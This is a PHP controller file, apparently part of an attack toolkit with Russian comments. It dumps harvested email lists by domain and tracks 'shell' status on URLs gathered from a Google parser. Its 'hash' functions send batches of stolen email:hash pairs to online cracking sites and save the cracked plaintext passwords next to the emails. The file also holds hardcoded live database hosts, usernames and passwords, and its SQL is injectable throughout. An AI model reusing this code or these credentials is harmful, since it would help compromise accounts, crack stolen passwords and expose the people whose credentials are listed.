					
					
					$data2 = $this->Filed->query("SELECT zona,email,domen FROM  `mails_one` WHERE `domen` = '$z'");
					$stop =  $this->get_time();
					
					$z2 = '';
					
					foreach($data2 as $d2)
					{
						$z2 .= $d2['mails_one']['email'];
						$z2 .= "\r\n";
						
					}
					$stop2 = $this->get_time();
					$this->d($stop2 - $start,'MAIL');
					
					
					
				}else//если больше чем lim тогда будем бить файл
				{
					echo 'countAll >'.$this->lim2.'<br>';
					$fh = fopen('.'.$download, "a+");
					
					if($fh){
						$this->d('$all - otkrit na dokachku');
					}
					
					$limitYes = true;
					
					
					
					if($p[$z]['countMail'] > $countMail)
					{
						
						echo 'Dokachka lastCountMail<br>';
						//расчёт сколько дампить надо по записям без пассов
						if(($p[$z]['countMailnoPass']-$lastCountMail) > $this->lim){
							$limitMail = $this->lim;	
						}else{
							$limitMail = $p[$z]['countMailnoPass']-$lastCountMail;
						}
						
						
						$data2 = $this->Filed->query("SELECT zona,email,domen FROM  `mails_one` WHERE `domen` = '$z'  limit {$lastCountMail},{$limitMail}" );
						
						$this->d("SELECT zona,email,domen FROM  `mails_one` WHERE `domen` = '$z'  limit {$lastCountMail},{$limitMail}");
						
						$z2 = '';
						
						foreach($data2 as $d)
						{
							$z2 .= $d['mails_one']['email'];
							$z2 .= "\r\n";
						}

						$next = $lastCountMail+$limitMail;
						
						$this->Post->query("UPDATE `renders_one` SET 
						`lastCountMail`=$next
						WHERE `domen` = '{$domen}'");
						
						$stop = $this->get_time();
						echo $stop - $start;
						//$this->d($z2,'z2');
						//exit;
					}

					
					$this->d(3);
					$this->d($limitMail,'limitMail');
					$this->d($lastCountMail,'lastCountMail');
					
				}
				
				$str = $z0.$z1.$z2;
				
				//$this->d($str);
				

				$this->Post->query('UPDATE `renders_one` SET 
				`countMail`='.$p[$z]['countMail'].',
				`download`="'.$all.'" 
				WHERE `domen`="'.$domen.'" ');
				
				
				
				//запись в файл
				fwrite($fh, $str);
				fclose($fh);
				
				$this->d($download,'staryi');
				$this->d($all,'novyi');
				
				if(file_exists('.'.$all) AND $limitYes != true){
					@unlink('.'.$download);
					echo '.'.$download.'<br>';
					
				}
				
				
				
				
				if($limitYes == TRUE AND file_exists('.'.$all)){
					$this->d('limitYes = yes - pereimenovivaem');
					
					@rename('.'.$download,'.'.$all);	
				}
				
				
			}
		}
		
		$stop =  $this->get_time();
		
		
		$this->d($stop - $start,'END');
		
		$this->stop();
		
		die;
		
	}
	
	
	function psn2(){//функция для использования при чеке одиночных URL из общей базы
		$time = time();
		
		$this->r = rand(1,100);
		
		echo $_SERVER['SERVER_NAME'].'<br>';
		
		//exit;
		if($_SERVER['SERVER_NAME'] == 'alex')
		{
			
			$hostname ='5.152.201.130';
			$username ='parsergoogle';
			$password ="Becon99";
			$dbname ='parsergoogle';
			
		}elseif($_SERVER['SERVER_NAME'] == 'old.innocentds.co.ua')
		{
			
			$hostname ='91.239.233.90';
			$username ='oldbot_user';
			$password ="W9N8REfp";
			$dbname ='app1_system';
			
		}elseif($_SERVER['SERVER_NAME'] == 'shell3.com')
		{
			
			$hostname ='5.152.201.130';
			$username ='parsergoogle';
			$password ="Becon99";
			$dbname ='parsergoogle';
			
		}
		
		
		
		
		
		if(!($this->connection = @mysql_connect($hostname,$username,$password))) {
			exit("<div style='font-size:16px; margin-top:40px;'>Вероятно Вы указали неверные данные для коннекта к базе данных. Проверьте корректность данных а файле conf.php</div>");
		}else{
			$this->d('connect ok');
		}
		mysql_select_db($dbname,$this->connection) or die ( mysql_error(). " Error no:".mysql_errno());
		mysql_query("SET NAMES 'utf8'",$this->connection);
		

		if(!$this->start2())
		{
			die('true netu(');
		}
		
		$this->timeStart = $this->start('psn',1);
		
		
		
		
		
		$urls = $this->Post->query("SELECT * FROM `posts` WHERE `status`=0");
		
		if(count($urls)<15)
		{	
			$this->Post->query("DELETE FROM `posts` WHERE `status` =0");	
		}else
		{
			$this->stop();
			$this->stop2();
			die('psn ostanovlen > 15 stepOne');
		}

		
		
		$urls2 = $this->Post->query("SELECT * FROM `posts` WHERE `status`=2 AND `prohod`<5 limit 130");
		
		if(count($urls2) > 50)
		{
			$this->stop();
			$this->stop2();
			
			die('psn ostanovlen > 50 stepTwo');
		}
		
		
		
		
		//$this->d(count($urls2),'count');
		
		$r = rand(1,100);
		$this->logs("PSN zapushen - № $r",__FUNCTION__);
		
		
		
		
		
		$dbSetChange = $this->SelectQueryWhere('urls', "shell=0", '*',false,"{$this->psn}",'FOR UPDATE');
		
		//print_r($dbSetChange);
		$this->d(count($dbSetChange),'count dbSetChange');
		
		flush();
		
		
		
		$new = time();
		$razn = $new-$time;
		if($razn>100)
		{
			$this->d($razn.'-razn psn po vremeni > 100:'.$r);
			$this->logs($razn.'-razn po vremeni psn:'.$r,__FUNCTION__);
			
			
			$this->stop();
			$this->stop2();
			die('stop 100');
		}
		
		foreach($dbSetChange as $val)
		{
			//$this->d($val);
			
			$this->workup();
			
			
			
			$url = str_replace('http://http://','http://',$val['url']);
			$url = str_replace('http://','',$val['url']);
			$url = 'http://'.$url;
			
			
			$p = parse_url($url);
			
			$p['host'] = str_replace('www.','',$p['host']); 
			
			$data = $this->Post->query("SELECT count(*) FROM `posts` WHERE url like '%".$p['host']."%'");
			
			echo $url.'<br>';
			flush();
			
			$this->d($data);	
			
			$f = __FUNCTION__;
			if($data[0][0]['count(*)'] == 0)
			{
				$date = $val['date'];
				$maska = $this->get_arg_url($url);
				$tema = $val['tema'];
				
				if($this->Post->query("INSERT INTO posts (url,date,tic,maska,tema) VALUES('{$url}','{$date}','0','{$maska}','$tema')"))
				{
					$this->d('OK '.$p['host']);
				}
				
				mysql_query("UPDATE `urls` SET  `shell` =  1,`tema`='".$f."' WHERE  `id` =".$val['id']);
			}else
			{
				$this->d('NO '.$p['host']);
				mysql_query("UPDATE `urls` SET  `shell` =  1,`tema`='".$f."' WHERE  `id` =".$val['id']);
				if($data[0][0]['count(*)'] > 1)
				{
					$data = $this->Post->query("SELECT id FROM `posts` WHERE url like '%".$p['host']."%'");
					echo '<br>&&&&----------------<br>';
					
					//$b=0;
					foreach($data as $vl)
					{
						//$this->d($vl);
						//if($b == 0)
						//{
						//	$b++;
						//	continue;
						//}
						
						if($this->Post->query("DELETE FROM  `posts` WHERE  id = ".$vl['posts']['id']." AND status=0"))
						{
							$this->d("DELETE FROM  `posts` WHERE  id = ".$vl['posts']['id']." AND status=0");
							$this->d('udalen '.$vl['posts']['id']);
						}
						
						if($vl['posts']['status'] == 2){
							if($this->Post->query("DELETE FROM  `posts` WHERE  id = ".$vl['posts']['id']." AND status=1"))
							{
								$this->d("DELETE FROM  `posts` WHERE  id = ".$vl['posts']['id']." AND status=1");
								$this->d('udalen '.$vl['posts']['id']);
							}
							
						}
						
					}
					
					
					echo '<br>!!!!----------------<br>';
				}	
			}
		}
		
		$this->logs("PSN ostenovlen - № $r",__FUNCTION__);
		$this->stop();
		$this->stop2();
		die();
	}
	
	function psn3(){//функция при чеке многих url одного сайта
		
		
	}
	
	
	////////РАСХЕШИРОВАНИЕ////////////
	
	function hash(){

		ignore_user_abort(true);
		
		if(!isset($_FILES['mails']['name']))
		{
			
			$tpl='Допустимый формат хэшей:<br><font color="red">md5()</font><br><font color="red">md5(md5())</font><br><font color="red">ntlm()</font><br><font color="red">lm()</font><br><font color="red">pwdump()</font><br>';
			$tpl.='<form action="" method="post" enctype="multipart/form-data">
			mail files:<br>
			<input name="mails" type="file"><br>
			<input type="submit" value="start">
			</form>';
			
			
			//$data = $this->Post->query("SELECT * FROM `hash`");$this->set('hash', $data);
			//if(isset($_GET['cmd']))
			//{
			//	$this->set('cmd', $_GET['cmd']);
			//}
		}
		else 
		{
			echo '111111';
			
			//Начинаем чекер майлов
			$uploaddir = './';
			$uploadfile = $uploaddir."hash.txt";
			copy($_FILES['mails']['tmp_name'], $uploadfile);
			$mail_arr=file("./hash.txt");
			
			
			for($i=0;$i<=count($mail_arr)-1;$i++)
			{
				$mail_arr2=explode(":",$mail_arr[$i]);	
				$mails[$i]=$mail_arr2[0];
				$hashes[$i]=$mail_arr2[1];
			}
			
			//Вычисляем кол-во
			$count=count($hashes);
			$lin=ceil($count/9);

			$this->d($lin,'$lin');
			
			$rr=0;
			for($b=0;$b<=$lin;$b++)
			{
				
				$hash="";
				
				$ch = curl_init();
				curl_setopt($ch, CURLOPT_URL, "http://c0llision.net/webcrack");
				curl_setopt($ch, CURLOPT_HEADER, 1);
				curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
				curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
				$tmp = explode(DIRECTORY_SEPARATOR,__FILE__);
				
				array_pop($tmp);
				array_push($tmp,$cookie);
				
				$cookie_file = implode(DIRECTORY_SEPARATOR,$tmp);
				curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
				curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
				curl_setopt($ch, CURLOPT_ENCODING, 'gzip,deflate');
				curl_setopt($ch, CURLOPT_USERAGENT,'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.56 Safari/535.11 YE');
				$result = curl_exec($ch);
				curl_close($ch);
				
				preg_match("<input type=\"hidden\" name=\"hash\[\_csrf\_token\]\" value=\"([^\"]*)\" id=\"hash\_\_csrf\_token\" />",$result,$pprt);
				preg_match_all('//Set-Cookie: opencrack=([^\;]*)\; path=///i',$result,$mass);
				$cook="opencrack=".$mass[1][0].";";
				
				for($i=($b*9);$i<=($b*9)+8;$i++)
				{
					if($i>=$count)
					{
						
					}
					else 
					{
						if($i==(($b*9)+9))
						{
							$hash.=trim($hashes[$i]);
						}
						else 
						{
							$hash.=trim($hashes[$i])."%0A";
						}
						
					}
				}

				$ch = curl_init();
				curl_setopt($ch, CURLOPT_URL, "http://c0llision.net/webcrack/request");
				curl_setopt($ch, CURLOPT_HEADER, 1);
				curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
				curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);



				curl_setopt($ch, CURLOPT_COOKIE, $cook);
				curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
				curl_setopt($ch,CURLOPT_POST,1);
				curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);

				curl_setopt($ch, CURLOPT_ENCODING, 'gzip,deflate');
				curl_setopt($ch, CURLOPT_USERAGENT,'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.56 Safari/535.11 YE');
				curl_setopt($ch, CURLOPT_POSTFIELDS, "hash[_csrf_token]={$pprt[1]}&hash[_input_]=$hash");
				$result = curl_exec($ch);
				curl_close($ch);
				preg_match_all("//<td class=\"plaintext\">([^<]*)</td>//iU",$result,$pp);
				preg_match_all("//<td><img src=\"([^\"]*)\" /></td>//iU",$result,$pp2);

				//Проверяем
				$x=0;
				
				for($t=0;$t<=count($pp2[1])-1;$t++)
				{
					
					if($pp2[1][$t]=="/images/ok.png")
					{
						$pass[$rr]=$pp[1][$x];$x++;
						
					}else
					{
						$pass[$rr]="no";
					}
					
					

					$date = date('Y-m-d h:i:s');
					$this->Post->query("INSERT INTO `hash` (mail,pass,hash,id,date) VALUES ('{$mails[$rr]}','{$pass[$rr]}','{$hashes[$rr]}','','{$date}');");
					echo $mails[$rr].":".$pass[$rr].":".md5($pass[$rr]).":".$hashes[$rr]."<br>";
					$rr++;
					
				}
			}
		}
		
		$this->set('tpl', $tpl);	

	}

	function hash3_old(){

		//$this->timeStart = $this->start('hash');
		
		
		$file = $this->Post->query("SELECT * FROM mails WHERE type='corp' AND pass !='0' AND hashtype !='0' AND hash2='0' limit 500");
		
		//this->stop();
		//$this->d($file);
		//exit;
		$mail_arr10='';
		foreach ($file as $val)
		{
			if($this->hashtype2($val['mails']['pass']) !='unkown' AND $this->hashtype2($val['mails']['pass']) !=1)
			{
				$g = trim($val['mails']['email']).':'.trim($val['mails']['pass']);
				$mail_arr10 .= trim($val['mails']['pass'])."<br>";
				$g = str_replace("/n",'',$g);
				$g = str_replace("\n",'',$g);
				$g = str_replace("\r\n",'',$g);
				$g = str_replace("\n\n",'',$g);
				$mail_arr[] = $g;
				//$this->d($val['mails']['email'].':'.$val['mails']['pass'].':'.$val['mails']['id'],'OK');
				
			}else
			{
				$this->d($val['mails']['pass'].' - neto md5');
				$this->Post->query("UPDATE  `mails` SET  `hash2` =  'no' WHERE  id =".$val['mails']['id']);
				
			}	
			
		}
		//$mail_arr2=file("./hash.txt");
		//$this->d($mail_arr10,'$mail_arr БД');
		print_r($mail_arr10);
		//$this->d($mail_arr2,'$mail_arr2 FILE');
		
		exit;  
		
		
		
		for($i=0;$i<=count($mail_arr)-1;$i++)
		{
			$mail_arr2=explode(":",$mail_arr[$i]);	
			$mails[$i]=$mail_arr2[0];
			$hashes[$i]=$mail_arr2[1];
		}
		
		//Вычисляем кол-во
		$count=count($hashes);
		$lin=ceil($count/9);

		$this->d($lin,'$lin');
		
		$rr=0;
		for($b=0;$b<=$lin;$b++)
		{
			
			$hash="";
			
			$ch = curl_init();
			curl_setopt($ch, CURLOPT_URL, "http://c0llision.net/webcrack");
			curl_setopt($ch, CURLOPT_HEADER, 1);
			curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
			curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
			$tmp = explode(DIRECTORY_SEPARATOR,__FILE__);
			
			array_pop($tmp);
			array_push($tmp,$cookie);
			
			$cookie_file = implode(DIRECTORY_SEPARATOR,$tmp);
			curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
			curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
			curl_setopt($ch, CURLOPT_ENCODING, 'gzip,deflate');
			curl_setopt($ch, CURLOPT_USERAGENT,'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.56 Safari/535.11 YE');
			$result = curl_exec($ch);
			curl_close($ch);
			
			preg_match("<input type=\"hidden\" name=\"hash\[\_csrf\_token\]\" value=\"([^\"]*)\" id=\"hash\_\_csrf\_token\" />",$result,$pprt);
			preg_match_all('//Set-Cookie: opencrack=([^\;]*)\; path=///i',$result,$mass);
			$cook="opencrack=".$mass[1][0].";";
			
			for($i=($b*9);$i<=($b*9)+8;$i++)
			{
				if($i>=$count)
				{
					
				}
				else 
				{
					if($i==(($b*9)+9))
					{
						$hash.=trim($hashes[$i]);
					}
					else 
					{
						$hash.=trim($hashes[$i])."%0A";
					}
					
				}
			}

			$ch = curl_init();
			curl_setopt($ch, CURLOPT_URL, "http://c0llision.net/webcrack/request");
			curl_setopt($ch, CURLOPT_HEADER, 1);
			curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
			curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);



			curl_setopt($ch, CURLOPT_COOKIE, $cook);
			curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
			curl_setopt($ch,CURLOPT_POST,1);
			curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);

			curl_setopt($ch, CURLOPT_ENCODING, 'gzip,deflate');
			curl_setopt($ch, CURLOPT_USERAGENT,'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.56 Safari/535.11 YE');
			curl_setopt($ch, CURLOPT_POSTFIELDS, "hash[_csrf_token]={$pprt[1]}&hash[_input_]=$hash");
			$result = curl_exec($ch);
			curl_close($ch);
			preg_match_all("//<td class=\"plaintext\">([^<]*)</td>//iU",$result,$pp);
			preg_match_all("//<td><img src=\"([^\"]*)\" /></td>//iU",$result,$pp2);

			//Проверяем
			$x=0;
			
			for($t=0;$t<=count($pp2[1])-1;$t++)
			{
				
				if($pp2[1][$t]=="/images/ok.png")
				{
					$pass[$rr]=$pp[1][$x];$x++;
					
				}else
				{
					$pass[$rr]="no";
				}
				
				

				$date = date('Y-m-d h:i:s');
				//$this->Post->query("INSERT INTO `hash` (mail,pass,hash,id,date) VALUES ('{$mails[$rr]}','{$pass[$rr]}','{$hashes[$rr]}','','{$date}');");
				$this->Post->query("UPDATE  `mails` SET  `hash2` =  '".$pass[$rr]."' WHERE  email ='".trim($mails[$rr])."'");
				echo $mails[$rr].":".$pass[$rr].":".$hashes[$rr]."<br>";
				$rr++;
				
			}
		}
		//$this->stop();
		


	}

	function hash3(){

		$this->timeStart = $this->start('hash',1);
		
		
		$file = $this->Post->query("SELECT * FROM mails WHERE pass !='0' AND hashtype !='0' AND hash2='0' ORDER BY id DESC limit 5000 ");
		
		//this->stop();
		//$this->d($file);
		//exit;
		$mail_arr10='';
		foreach ($file as $val)
		{
			if($this->hashtype2($val['mails']['pass']) !='unkown' AND $this->hashtype2($val['mails']['pass']) !=1)
			{
				$g = trim($val['mails']['email']).':'.trim($val['mails']['pass']);
				$mail_arr10 .= trim($val['mails']['pass'])."<br>";
				$g = str_replace("/n",'',$g);
				$g = str_replace("\n",'',$g);
				$g = str_replace("\r\n",'',$g);
				$g = str_replace("\n\n",'',$g);
				$mail_arr[] = $g;
				$mail_arr20[trim($val['mails']['pass'])] = trim($val['mails']['email']);
				//$this->d($val['mails']['email'].':'.$val['mails']['pass'].':'.$val['mails']['id'],'OK');
				
			}else
			{
				//$this->d($val['mails']['pass'].' - neto md5');
				$this->Post->query("UPDATE  `mails` SET  `hash2` =  'no' WHERE  id =".$val['mails']['id']);
				
			}	
			
		}
		//$mail_arr2=file("./hash.txt");
		//$this->d($mail_arr10,'$mail_arr БД');
		//print_r($mail_arr10);
		//$this->d($mail_arr2,'$mail_arr2 FILE');
		
		
		
		
		
		for($i=0;$i<=count($mail_arr)-1;$i++)
		{
			$mail_arr2=explode(":",$mail_arr[$i]);	
			$mails[$i]=$mail_arr2[0];
			$hashes[$i]=$mail_arr2[1];
		}
		
		//Вычисляем кол-во
		$count=count($hashes);
		$lin=ceil($count/50);

		//	$this->d($lin,'$lin');
		
		//exit;
		
		
		
		$rr=0;
		for($b=0;$b<=$lin;$b++)
		{
			
			$hash="";
			
			$kuku = array();
			for($i=($b*48);$i<=($b*48)+8;$i++)
			{
				if($i>=$count)
				{
					
				}
				else 
				{
					if($i==($b*48)+9)
					{
						//$this->d($i,'ii');
						$hash.=trim($hashes[$i]);
						$kuku[trim($hashes[$i])] ='ku' ;
					}
					else 
					{
						//$this->d($i);
						$hash.=trim($hashes[$i])."%0D%0A";
						$kuku[trim($hashes[$i])] ='ku' ;
					}
					
				}
			}
			
			//	$hash = $hash."%0D%0A81dc9bdb52d04dc20036dbd8313ed055%0D%0Af1534cd6b03bca4163d5773a988dc3bc";
			
			$hash = 'list='.$hash.'&crack=Crack+Hashes';
			
			//$this->d($hash);
			
			$html = $this->s_curl('http://www.md5crack.com/home',true,$hash);
			
			
			//$this->d($html);
			
			
			

			//	preg_match_all("//<p class=\"plaintext\">([^<]*)</td>//iU",$result,$pp);
			//preg_match_all("//<td><img src=\"([^\"]*)\" /></td>//iU",$result,$pp2);
			
			
			
			
			@preg_match_all("//<p class=\"success\"><strong>([^<]*)</strong>:([^<]*)</p>//iU",$html,$pp);
			
			
			
			
			// $this->d($pp);
			
			
			//Проверяем
			$x=0;
			$suc = array();
			
			for($i=0;$i<count($pp[1]);$i++)
			{
				@$suc[$pp[1][$i]] = $pp[2][$i];
				unset($kuku[$pp[1][$i]]);
			}
			
			//$this->d($suc,'suc');
			
			//$this->d($kuku,'kuku');
			
			//удачные
			if(count($suc)>0)
			{
				foreach($suc as $t=>$p)
				{
					
					$date = date('Y-m-d h:i:s');
					//$this->Post->query("INSERT INTO `hash` (mail,pass,hash,id,date) VALUES ('{$mails[$rr]}','{$pass[$rr]}','{$hashes[$rr]}','','{$date}');");
					$this->Post->query("UPDATE  `mails` SET  `hash2` =  '".$p."' WHERE  pass ='".trim($t)."'");
					
					$this->d("UPDATE  `mails` SET  `hash2` =  '".$p."' WHERE  pass ='".trim($t)."'");
					echo $t.":".$p." OK!!!!!!!<br>";
					$rr++;
				}
			}
			
			//exit;
			
			//не удачные
			if(count($kuku)>0)
			{
				foreach($kuku as $t2=>$p2)
				{
					
					$date = date('Y-m-d h:i:s');
					//$this->Post->query("INSERT INTO `hash` (mail,pass,hash,id,date) VALUES ('{$mails[$rr]}','{$pass[$rr]}','{$hashes[$rr]}','','{$date}');");
					$this->Post->query("UPDATE  `mails` SET  `hash2` =  'no' WHERE  email ='".$mail_arr20[trim($t2)]."'");
					//$this->d("UPDATE  `mails` SET  `hash2` =  'no' WHERE  email ='".$mail_arr20[trim($t2)]."'");
					
					echo $t2.":NO<br>";
					$rr++;
				}
			}
			//exit;
			sleep(5);
		}
		$this->stop();
		


	}

	
	////ОПРЕДЕЛЯЕМ ТИПА ХЭША/////////////
	
	function hashtype($str){//определение хэша у пароля
		
		$hash=array(
		
		array('md3, md4 hmac, md5, md5 hmac, ripmed 128, NTHash, LM, MacroHash','/^[a-zA-Z0-9]{32}$/'), 

		array('md4 base64, md5 base64,','/^[a-zA-Z0-9\/\+]{22}\=\=[a-zA-Z0-9\/]{3}\=$/'), 

		array('md5 Unix,','/^\$\d\$[\D\d]*\$[a-zA-Z0-9\.\/]{22}$/'), 

		array('md5 APR,','/^\$apr1\$[\D\d]*\$[a-zA-Z0-9\.\/]{22}$/'), 

		array('sha-1 base64,','/^[a-zA-Z0-9\/\+\=]{28}$/'), 

		array('mysql5, sha-1, sha-1 hmac, ripmed 160,','/^[a-zA-Z0-9]{40}$/'), 

		array('sha-256, ГОСТ Р34.11-94, ripmed 256,','/^[a-zA-Z0-9]{64}$/'), 

		array('ripmed 320,','/^[a-zA-Z0-9]{80}$/'), 

		array('sha-384,','/^[a-zA-Z0-9]{98}$/'), 

		array('sha-512,','/^[a-zA-Z0-9]{128}$/'));
		
		
		$hashstr=''; 

		for($i=0;$i<count($hash);$i++){ 

			if(preg_match($hash[$i]['1'],$str))$hashstr.=$hash[$i]['0']; 
		} 

		if(!empty($hashstr)){
			return $hashstr;
		}elseif(strlen($str) > 14){ 
			return 'unkown';
		}else{
			return 1;
		}
		
	}
	
	function hashtype2($str){//определение хэша у пароля
		
		$hash=array(
		
		array('md3, md4 hmac, md5, md5 hmac, ripmed 128, NTHash, LM, MacroHash','/^[a-zA-Z0-9]{32}$/')); 

		$hashstr=''; 

		for($i=0;$i<count($hash);$i++){ 

			if(preg_match($hash[$i]['1'],$str))$hashstr.=$hash[$i]['0']; 
		} 

		if(!empty($hashstr)){
			return $hashstr;
		}elseif(strlen($str) > 16){ 
			return 'unkown';
		}else{
			return 1;
		}
		
	}
	
	
	
	///// ФУНКЦИИ УПРАВЛЕНИЯ ПОТОКАМИ/////////////
	
	
	function workup(){ //устанавливает время в таблице start
		

		$this->Post->query('UPDATE  `starts` SET  `lasttime` =  '.time().' WHERE  `time_start` ='.$this->timeStart,false);			
		
		return true;
		
	}
	
	function thepid(){ //возвращает пид процесса
		

		$pid= $this->Post->query('SELECT * FROM  `starts` WHERE   `time_start` ='.$this->timeStart);	
		
		return $pid ;
		
	}
	
	function start($name='unknown',$potok=1){ // анализирует количество потоков у той или иной функции
		
		$this->Funcname = $name;
		
		if($name == 'rendown1'){
			$p = "AND";
		}
		
		
		$time = time()-3600;
		$start = $this->Post->query('SELECT * FROM  `starts` WHERE `lasttime`>'.$time.' AND `function` ="'.$name.'"  ');	

		if(count($start)>=$potok)
		{
			die('Уже запущено максимально');
		}else
		{
			
			
			$this->Post->query('DELETE FROM  `starts` WHERE `lasttime` <'.$time.' AND `function` ="'.$name.'"');	
			
			$time = time();
			
			$pid  = getmypid();
			$this->pid = $pid;
			
			$data['Start']['id'] 		 = 0;
			$data['Start']['function']   = $name;
			$data['Start']['lasttime']   = $time;
			$data['Start']['time_start'] = $time;
			$data['Start']['pid']		 = $pid; 
			$this->Start->save($data);
			//echo $pid;
			return $time;
			
			
		}
	}
	
	function start_one($name='unknown',$potok=1){ // анализирует количество потоков у той или иной функции
		
		$this->Funcname = $name;
		
		if($name == 'rendown1'){
			$p = "AND";
		}
		
		
		$time = time()-3600;
		$start = $this->Post->query('SELECT * FROM  `starts_one` WHERE `lasttime`>'.$time.' AND `function` ="'.$name.'"  ');	

		if(count($start)>=$potok)
		{
			die('Уже запущено максимально');
		}else
		{
			
			
			$this->Post->query('DELETE FROM  `starts_one` WHERE `lasttime` <'.$time.' AND `function` ="'.$name.'"');	
			
			$time = time();
			
			$pid  = getmypid();
			$this->pid = $pid;
			
			$data['Start_one']['id'] 		 = 0;
			$data['Start_one']['function']   = $name;
			$data['Start_one']['lasttime']   = $time;
			$data['Start_one']['time_start'] = $time;
			$data['Start_one']['pid']		 = $pid; 
			$this->Start->save($data);
			//echo $pid;
			return $time;
			
			
		}
	}
	
	function start2(){ // смотри чтобы только один процесс при работе с googleparsing был запущен
		
		$start = $this->SelectQueryWhere('starts', "function='psn'", '*');
		
		if($start[0]['function']=='psn')
		{
			die('Уже запущено PSN na GOOGLE PARSER');
			
		}elseif($start[0]['function']=='psn_local')
		{
			die('Уже запущено PSN_LOCAL na GOOGLE PARSER');
		}else
		{
			
			mysql_query("DELETE  FROM `starts` WHERE function='psn'",$this->connection);	
			
			if(mysql_query("INSERT INTO `starts` (function) VALUES ('psn')",$this->connection)){	
				return true;
			}
		}
	}
	
	function stop(){//очищает всё из start

		
		$this->Post->query('DELETE  FROM `starts` WHERE `function` = "'.$this->Funcname.'" AND  `time_start` ='.$this->timeStart);
		

		return true;
	}
	
	function stop2(){//очищает всё из starts у googleparsing

		
		mysql_query('DELETE  FROM `starts` WHERE `function` = "psn"',$this->connection);	

		return true;
	}
	
	function pid_stop(){//стопает кроны которые долго не отвечают
		
		$this->timeStart = $this->start('pid_stop');
		
		$st3 = $this->Post->query("SELECT * FROM `multis` WHERE `get`=1");
		
		$bd = $this->bdmain;
		
		foreach($st3  as $work3){
			
			
			$time = time();
			
			if(($time - $work3['multis']['date']) > 500)
			{
				
				$this->workup();
				
				$id = $work3['multis']['id'];
				$status  = 1;
				$pid =  $work3['multis']['pid'];
				
				$this->logs("pid_ stop kill -9 ".$pid,__FUNCTION__);
				
				$this->Filed->query("DELETE FROM `starts` WHERE `pid` = $pid");
				
				$this->d($id);
				$this->d($work3,'Завис');
				
				
				if($work3['multis']['dok'] == 0){
					$status = 3;
				}
				
				if($work3['multis']['dok'] == 1){
					$status = 2;
				}
				
				
				
				
				$this->Post->query("UPDATE  `{$bd}`.`multis` SET  `get` = '{$status}' WHERE  `id` =".$id."");
				
				
				
				if($pid == 0)
				{
					
					echo 'PID!!! = '.$pid;
					
				}else{
					
					exec("kill -9 ".$pid);
				}
				
				
				
				
				
				
			}else{
				
				$this->d($work3['multis']['potok'].' norm potok');
			}
			
			
		}
		
		
		
		
		////
		
		
		$st4 = $this->Post->query("SELECT * FROM `multis_one` WHERE `get`=1");
		
		foreach($st4  as $work3){
			
			
			$time = time();
			
			if(($time - $work3['multis_one']['date']) > 500)
			{
				
				$this->workup();
				
				$id = $work3['multis_one']['id'];
				$status  = 1;
				$pid =  $work3['multis_one']['pid'];
				
				$this->logs("pid_ stop kill -9 ".$pid,__FUNCTION__);
				
				$this->Filed->query("DELETE FROM `starts` WHERE `pid` = $pid");
				
				$this->d($id);
				$this->d($work3,'Завис');
				
				
				if($work3['multis_one']['dok'] == 0){
					$status = 3;
				}
				
				if($work3['multis_one']['dok'] == 1){
					$status = 2;
				}
				
				if($work3['multis_one']['dok'] == 2){
					$status = 3;
				}
				
				if($work3['multis_one']['dok'] == 3){
					$status = 3;
				}
				
				if($work3['multis_one']['dok'] == 4){
					$status = 3;
				}
				
				if($work3['multis_one']['dok'] == 5){
					$status = 3;
				}
				
				
				
				
				
				$this->d($bd,'base');
				
				
				
				
				
				if(	$this->Post->query("UPDATE  `{$bd}`.`multis_one` SET  `get` = {$status} WHERE  id=".$id)){
					
					$this->d("UPDATE  `{$bd}`.`multis_one` SET  `get` = {$status} WHERE  id=".$id);
				}
					
					
					
					if($pid == 0)
					{
						
						echo 'PID!!! = '.$pid;
						
					}else{
						
						exec("kill -9 ".$pid);
					}
					
					
				
				
				
				
			}else{
				
				$this->d($work3['multis_one']['potok'].' norm potok');
			}
			
			
		}
		
		
		$this->stop();
	}
	
	
	///////ПОЛУЧЕНИЕ, ОТПРАВКА КОНТЕНТА ИЛИ GET POST ЗАПРОСОВ////////
	
	function streampars($url,$time2=30,$header = 1){// дочерняя функция для мультикурла FIND*

		
        $url = trim($url);
        
		$ch = curl_init($url);
		
		$uagent = array(
		"Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.0.8) Gecko/2009032609 Firefox/3.0.8","Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; dial",		  
		"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; dial; E-nrgyPlus; .NET CLR 1.1.4322; InfoPath.1)",
		"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; dial; SV1; .NET CLR 1.0.3705)",
		"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; ds-66843412; Sgrunt|V109|1|S-66843412|dial; .NET CLR 1.1.4322)",
		"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; eMusic DLM/3; MSN Optimized;US; MSN Optimized;US)",
		"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; elertz 2.4.025; .NET CLR 1.0.3705; .NET CLR 1.1.4322; Media Center PC 4.0)",
